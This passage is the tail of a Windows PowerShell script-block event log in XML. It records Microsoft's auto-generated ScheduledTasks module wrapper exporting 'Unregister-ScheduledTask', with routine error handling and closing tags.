        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_ScheduledTask_v1.0.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Unregister-ScheduledTask' -Alias '*'
        
</Data>
<Data Name="ScriptBlockId">3da40cfd-6c88-4476-91d7-3ef4c843e17b</Data>
<Data Name="Path"></Data>
</EventData>
</Event>

</Events>
